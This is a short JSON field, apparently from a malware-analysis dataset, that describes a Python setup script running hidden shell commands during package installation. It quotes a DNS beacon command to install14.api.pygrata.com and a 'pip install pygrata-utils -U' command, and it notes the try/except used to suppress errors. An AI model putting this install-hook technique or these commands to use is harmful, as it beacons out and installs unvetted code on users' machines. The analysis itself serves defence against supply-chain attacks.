      "malicious_behavior": "This code executes arbitrary shell commands during the installation process of a Python package by invoking subprocess.getoutput within a try/except block. Specifically, it runs 'dig @1.1.1.1 install14.api.pygrata.com', which may be used for network beaconing, exfiltration, or C2 communication, and 'pip install pygrata-utils -U', which installs or updates a potentially malicious or unauthorized package. These actions are performed automatically and without user consent, and are embedded in the setup script, a hallmark of supply chain attacks. The use of a hardcoded, suspicious domain (install14.api.pygrata.com) and the lack of any legitimate business logic or user-facing functionality further indicate malicious intent. The try/except block suppresses all errors, which is a common evasion technique. This pattern is strongly associated with malware and supply chain attacks in the Python ecosystem.",
